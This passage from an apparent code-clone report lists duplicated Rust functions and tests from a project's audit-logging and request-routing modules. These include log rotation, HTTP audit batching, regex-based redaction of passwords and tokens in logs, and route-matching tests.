        f.debug_struct("CompiledRedactionRules")
            .field("rules_count", &self.rules.len())
            .field("rule_names", &self.rules.iter().map(|(name, _, _)| name.as_str()).collect::<Vec<_>>())
            .finish()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1024

**Code:**
```
    fn test_redaction_rules_empty() {
        let rules = CompiledRedactionRules::empty();
        assert!(rules.is_empty());
        assert_eq!(rules.redact("test"), "test");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1363

**Code:**
```
    fn test_audit_logger_disabled() {
        let logger = AuditLogger::disabled();

        // Should not panic when logging to disabled logger
        logger.log_auth_success("user1");
        logger.log_auth_failure("bad credentials");
        logger.log_tool_call("user1", "read_file", Some("req-1"));
        logger.log_rate_limited("user1");
        logger.log_authz_denied("user1", "write_file", "not allowed");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1063

**Code:**
```
    fn test_redaction_rules_password() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r#"(?i)(password|passwd|secret)["\s:=]+["\']?([^"\'`,\s}{]+)"#.to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = r#"{"password": "super_secret_123"}"#;
        let output = rules.redact(input);
        assert!(!output.contains("super_secret_123"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1171

**Code:**
```
    fn test_rotating_file_writer_creation() {
        let temp_dir = TempDir::new().expect("Should create temp dir");
        let log_path = temp_dir.path().join("test.log");

        let config = LogRotationConfig {
            enabled: true,
            max_size_bytes: Some(1024),
            max_age_secs: None,
            max_backups: 3,
            compress: false,
        };

        let writer = RotatingFileWriter::new(log_path.clone(), config);
        assert!(writer.is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.4% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1363

**Code:**
```
    fn test_audit_logger_disabled() {
        let logger = AuditLogger::disabled();

        // Should not panic when logging to disabled logger
        logger.log_auth_success("user1");
        logger.log_auth_failure("bad credentials");
        logger.log_tool_call("user1", "read_file", Some("req-1"));
        logger.log_rate_limited("user1");
        logger.log_authz_denied("user1", "write_file", "not allowed");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1047

**Code:**
```
    fn test_redaction_rules_api_key() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "api_keys".to_string(),
                pattern: r"(?i)(api[_-]?key)[=:]\s*([a-zA-Z0-9_\-]{20,})".to_string(),
                replacement: "$1=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Config: api_key=sk-1234567890abcdefghij1234567890";
        let output = rules.redact(input);
        assert!(!output.contains("sk-1234567890"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1024

**Code:**
```
    fn test_redaction_rules_empty() {
        let rules = CompiledRedactionRules::empty();
        assert!(rules.is_empty());
        assert_eq!(rules.redact("test"), "test");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.1% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1328

**Code:**
```
    fn test_audit_entry_serialization() {
        let entry = AuditEntry::new(EventType::AuthFailure)
            .with_identity("user1")
            .with_success(false)
            .with_message("Invalid credentials");

        let json = serde_json::to_string(&entry).expect("Should serialize");
        assert!(json.contains("auth_failure"));
        assert!(json.contains("user1"));
        assert!(json.contains("Invalid credentials"));
        assert!(json.contains("\"success\":false"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.1% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.1% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 288

**Code:**
```
    fn cleanup_old_backups(&self) -> io::Result<()> {
        let parent = self.path.parent().unwrap_or_else(|| std::path::Path::new("."));
        let base_name = self.path.file_name().unwrap_or_default().to_string_lossy();

        // Find all backup files
        let mut backups: Vec<_> = fs::read_dir(parent)?
            .filter_map(|e| e.ok())
            .filter(|e| {
                let name = e.file_name().to_string_lossy().to_string();
                // Match files like "audit.log.20251225-120000" or "audit.log.20251225-120000.gz"
                name.starts_with(&format!("{}.", base_name)) && name != base_name.as_ref()
            })
            .collect();

        // Sort by modification time (oldest first)
        backups.sort_by_key(|e| {
            e.metadata()
                .and_then(|m| m.modified())
                .unwrap_or(std::time::SystemTime::UNIX_EPOCH)
        });

        // Remove oldest backups if we have too many
        let to_remove = backups.len().saturating_sub(self.config.max_backups);
        for entry in backups.into_iter().take(to_remove) {
            let path = entry.path();
            if let Err(e) = fs::remove_file(&path) {
                tracing::warn!(error = %e, path = %path.display(), "Failed to remove old backup");
            } else {
                tracing::debug!(path = %path.display(), "Removed old backup file");
            }
        }

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1101

**Code:**
```
    fn test_redaction_rules_invalid_regex() {
        let result = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "invalid".to_string(),
                pattern: "[invalid(regex".to_string(), // Invalid regex
                replacement: "[REDACTED]".to_string(),
            },
        ]);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.8% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.7% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.6% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.6% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1031

**Code:**
```
    fn test_redaction_rules_bearer_token() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer_tokens".to_string(),
                pattern: r"Bearer\s+[A-Za-z0-9\-_.]+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xyz";
        let output = rules.redact(input);
        assert!(!output.contains("eyJ"));
        assert!(output.contains("Bearer [REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.5% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1308

**Code:**
```
    fn test_audit_entry_all_fields() {
        let entry = AuditEntry::new(EventType::ToolCall)
            .with_identity("user1")
            .with_method("tools/call")
            .with_tool("read_file")
            .with_success(true)
            .with_message("File read successfully")
            .with_duration(150)
            .with_request_id("req-123");

        assert_eq!(entry.identity_id, Some("user1".to_string()));
        assert_eq!(entry.method, Some("tools/call".to_string()));
        assert_eq!(entry.tool, Some("read_file".to_string()));
        assert!(entry.success);
        assert_eq!(entry.message, Some("File read successfully".to_string()));
        assert_eq!(entry.duration_ms, Some(150));
        assert_eq!(entry.request_id, Some("req-123".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1308

**Code:**
```
    fn test_audit_entry_all_fields() {
        let entry = AuditEntry::new(EventType::ToolCall)
            .with_identity("user1")
            .with_method("tools/call")
            .with_tool("read_file")
            .with_success(true)
            .with_message("File read successfully")
            .with_duration(150)
            .with_request_id("req-123");

        assert_eq!(entry.identity_id, Some("user1".to_string()));
        assert_eq!(entry.method, Some("tools/call".to_string()));
        assert_eq!(entry.tool, Some("read_file".to_string()));
        assert!(entry.success);
        assert_eq!(entry.message, Some("File read successfully".to_string()));
        assert_eq!(entry.duration_ms, Some(150));
        assert_eq!(entry.request_id, Some("req-123".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 859

**Code:**
```
    fn new(
        url: String,
        headers: HashMap<String, String>,
        batch_size: usize,
        flush_interval_secs: u64,
    ) -> Self {
        let client = reqwest::Client::builder()
            .timeout(Duration::from_secs(AUDIT_HTTP_TIMEOUT_SECS))
            .build()
            .unwrap_or_else(|e| {
                tracing::warn!(
                    error = %e,
                    "Failed to create HTTP client with custom config, using default"
                );
                reqwest::Client::new()
            });

        Self {
            url,
            headers,
            batch_size,
            flush_interval: Duration::from_secs(flush_interval_secs),
            client,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.3% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 276

**Code:**
```
    fn compress_file(source: &PathBuf, dest: &PathBuf) -> io::Result<()> {
        let input = File::open(source)?;
        let output = File::create(dest)?;
        let mut encoder = GzEncoder::new(output, Compression::default());

        io::copy(&mut io::BufReader::new(input), &mut encoder)?;
        encoder.finish()?;

        Ok(())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.2% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1363

**Code:**
```
    fn test_audit_logger_disabled() {
        let logger = AuditLogger::disabled();

        // Should not panic when logging to disabled logger
        logger.log_auth_success("user1");
        logger.log_auth_failure("bad credentials");
        logger.log_tool_call("user1", "read_file", Some("req-1"));
        logger.log_rate_limited("user1");
        logger.log_authz_denied("user1", "write_file", "not allowed");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1113

**Code:**
```
    fn test_redaction_preserves_non_sensitive_data() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "passwords".to_string(),
                pattern: r"password=\S+".to_string(),
                replacement: "password=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "user=john tool=read_file status=success";
        let output = rules.redact(input);
        assert_eq!(input, output); // No changes
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.0% similarity.

- **File:** `src/audit/mod.rs`
- **Line:** 1078

**Code:**
```
    fn test_redaction_rules_multiple_patterns() {
        let rules = CompiledRedactionRules::new(&[
            RedactionRule {
                name: "bearer".to_string(),
                pattern: r"Bearer\s+\S+".to_string(),
                replacement: "Bearer [REDACTED]".to_string(),
            },
            RedactionRule {
                name: "api_key".to_string(),
                pattern: r"api_key=\S+".to_string(),
                replacement: "api_key=[REDACTED]".to_string(),
            },
        ]).expect("Should compile");

        let input = "Auth: Bearer xyz123 and api_key=abc456";
        let output = rules.redact(input);
        assert!(!output.contains("xyz123"));
        assert!(!output.contains("abc456"));
        assert!(output.contains("Bearer [REDACTED]"));
        assert!(output.contains("api_key=[REDACTED]"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 269

**Code:**
```
    fn test_route_matcher_exact() {
        let routes = vec![
            create_test_route("github", "/github", false),
            create_test_route("filesystem", "/filesystem", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        assert_eq!(matcher.match_path("/github/repos"), Some("github"));
        assert_eq!(matcher.match_path("/filesystem/read"), Some("filesystem"));
        assert_eq!(matcher.match_path("/unknown/path"), None);
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.9% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 282

**Code:**
```
    fn test_route_matcher_longest_prefix() {
        let routes = vec![
            create_test_route("api", "/api", false),
            create_test_route("api-v2", "/api/v2", false),
        ];
        let matcher = RouteMatcher::new(&routes);

        // Longer prefix should win
        assert_eq!(matcher.match_path("/api/v2/users"), Some("api-v2"));
        assert_eq!(matcher.match_path("/api/v1/users"), Some("api"));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 472

**Code:**
```
    fn test_router_transform_path() {
        use crate::mocks::MockTransport;
        let mut config = create_test_route("strip", "/strip", true);
        config.strip_prefix = true;
        
        let router = ServerRouter {
            routes: vec![ServerRoute {
                config: config.clone(),
                transport: Arc::new(MockTransport::new()), 
            }],
            default_route: None,
        };
        
        // Should strip prefix
        assert_eq!(router.transform_path("/strip/foo"), "/foo");
        
        // Should return original if no match
        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
        
        // Should return original if strip_prefix is false
        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
        let router_no_strip = ServerRouter {
            routes: vec![ServerRoute {
                config: config_no_strip,
                transport: Arc::new(MockTransport::new()),
            }],
            default_route: None,
        };
        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 472

**Code:**
```
    fn test_router_transform_path() {
        use crate::mocks::MockTransport;
        let mut config = create_test_route("strip", "/strip", true);
        config.strip_prefix = true;
        
        let router = ServerRouter {
            routes: vec![ServerRoute {
                config: config.clone(),
                transport: Arc::new(MockTransport::new()), 
            }],
            default_route: None,
        };
        
        // Should strip prefix
        assert_eq!(router.transform_path("/strip/foo"), "/foo");
        
        // Should return original if no match
        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
        
        // Should return original if strip_prefix is false
        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
        let router_no_strip = ServerRouter {
            routes: vec![ServerRoute {
                config: config_no_strip,
                transport: Arc::new(MockTransport::new()),
            }],
            default_route: None,
        };
        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 472

**Code:**
```
    fn test_router_transform_path() {
        use crate::mocks::MockTransport;
        let mut config = create_test_route("strip", "/strip", true);
        config.strip_prefix = true;
        
        let router = ServerRouter {
            routes: vec![ServerRoute {
                config: config.clone(),
                transport: Arc::new(MockTransport::new()), 
            }],
            default_route: None,
        };
        
        // Should strip prefix
        assert_eq!(router.transform_path("/strip/foo"), "/foo");
        
        // Should return original if no match
        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
        
        // Should return original if strip_prefix is false
        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
        let router_no_strip = ServerRouter {
            routes: vec![ServerRoute {
                config: config_no_strip,
                transport: Arc::new(MockTransport::new()),
            }],
            default_route: None,
        };
        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 472

**Code:**
```
    fn test_router_transform_path() {
        use crate::mocks::MockTransport;
        let mut config = create_test_route("strip", "/strip", true);
        config.strip_prefix = true;
        
        let router = ServerRouter {
            routes: vec![ServerRoute {
                config: config.clone(),
                transport: Arc::new(MockTransport::new()), 
            }],
            default_route: None,
        };
        
        // Should strip prefix
        assert_eq!(router.transform_path("/strip/foo"), "/foo");
        
        // Should return original if no match
        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
        
        // Should return original if strip_prefix is false
        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
        let router_no_strip = ServerRouter {
            routes: vec![ServerRoute {
                config: config_no_strip,
                transport: Arc::new(MockTransport::new()),
            }],
            default_route: None,
        };
        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 472

**Code:**
```
    fn test_router_transform_path() {
        use crate::mocks::MockTransport;
        let mut config = create_test_route("strip", "/strip", true);
        config.strip_prefix = true;
        
        let router = ServerRouter {
            routes: vec![ServerRoute {
                config: config.clone(),
                transport: Arc::new(MockTransport::new()), 
            }],
            default_route: None,
        };
        
        // Should strip prefix
        assert_eq!(router.transform_path("/strip/foo"), "/foo");
        
        // Should return original if no match
        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
        
        // Should return original if strip_prefix is false
        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
        let router_no_strip = ServerRouter {
            routes: vec![ServerRoute {
                config: config_no_strip,
                transport: Arc::new(MockTransport::new()),
            }],
            default_route: None,
        };
        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 472

**Code:**
```
    fn test_router_transform_path() {
        use crate::mocks::MockTransport;
        let mut config = create_test_route("strip", "/strip", true);
        config.strip_prefix = true;
        
        let router = ServerRouter {
            routes: vec![ServerRoute {
                config: config.clone(),
                transport: Arc::new(MockTransport::new()), 
            }],
            default_route: None,
        };
        
        // Should strip prefix
        assert_eq!(router.transform_path("/strip/foo"), "/foo");
        
        // Should return original if no match
        assert_eq!(router.transform_path("/other/foo"), "/other/foo");
        
        // Should return original if strip_prefix is false
        let config_no_strip = create_test_route("no-strip", "/no-strip", false);
        let router_no_strip = ServerRouter {
            routes: vec![ServerRoute {
                config: config_no_strip,
                transport: Arc::new(MockTransport::new()),
            }],
            default_route: None,
        };
        assert_eq!(router_no_strip.transform_path("/no-strip/foo"), "/no-strip/foo");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.5% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 445

**Code:**
```
    fn test_router_send_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let test_message = Message::request(1, "ping", None);
        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.send("/unknown", test_message)
        );
        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 378

**Code:**
```
    fn test_config_validation_stdio_missing_command() {
        let mut config = ServerRouteConfig {
            name: "stdio".to_string(),
            path_prefix: "/stdio".to_string(),
            transport: TransportType::Stdio,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
        
        config.command = Some("node".to_string());
        assert!(config.validate().is_ok());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 427

**Code:**
```
    fn test_router_new_validation() {
        // Test with invalid URL scheme to ensure validation runs
        let invalid_config = ServerRouteConfig {
            name: "invalid".to_string(),
            path_prefix: "/invalid".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("not-a-url".to_string()),
            strip_prefix: false,
        };
        
        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.4% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 427

**Code:**
```
    fn test_router_new_validation() {
        // Test with invalid URL scheme to ensure validation runs
        let invalid_config = ServerRouteConfig {
            name: "invalid".to_string(),
            path_prefix: "/invalid".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: Some("not-a-url".to_string()),
            strip_prefix: false,
        };
        
        let result = tokio::runtime::Runtime::new().unwrap().block_on(ServerRouter::new(vec![invalid_config]));
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), RouterError::TransportInit(_, _)));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.3% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 295

**Code:**
```
    fn test_config_validation() {
        let valid = create_test_route("test", "/test", false);
        assert!(valid.validate().is_ok());

        let mut invalid = create_test_route("test", "no-slash", false);
        assert!(invalid.validate().is_err());

        invalid.path_prefix = "/test".to_string();
        invalid.name = "".to_string();
        assert!(invalid.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.2% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 459

**Code:**
```
    fn test_router_receive_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.receive("/unknown")
        );
        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 395

**Code:**
```
    fn test_config_validation_http_missing_url() {
        let config = ServerRouteConfig {
            name: "http".to_string(),
            path_prefix: "/http".to_string(),
            transport: TransportType::Http,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 409

**Code:**
```
    fn test_config_validation_sse_missing_url() {
        let config = ServerRouteConfig {
            name: "sse".to_string(),
            path_prefix: "/sse".to_string(),
            transport: TransportType::Sse,
            command: None,
            args: vec![],
            url: None,
            strip_prefix: false,
        };
        assert!(config.validate().is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 445

**Code:**
```
    fn test_router_send_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let test_message = Message::request(1, "ping", None);
        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.send("/unknown", test_message)
        );
        assert!(matches!(result, Err(RouterError::NoRoute(_))));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.1% similarity.

- **File:** `src/router/mod.rs`
- **Line:** 459

**Code:**
```
    fn test_router_receive_no_route() {
        let router = ServerRouter {
            routes: vec![],
            default_route: None,
        };

        let result = tokio::runtime::Runtime::new().unwrap().block_on(
            router.receive("/unknown")
        );
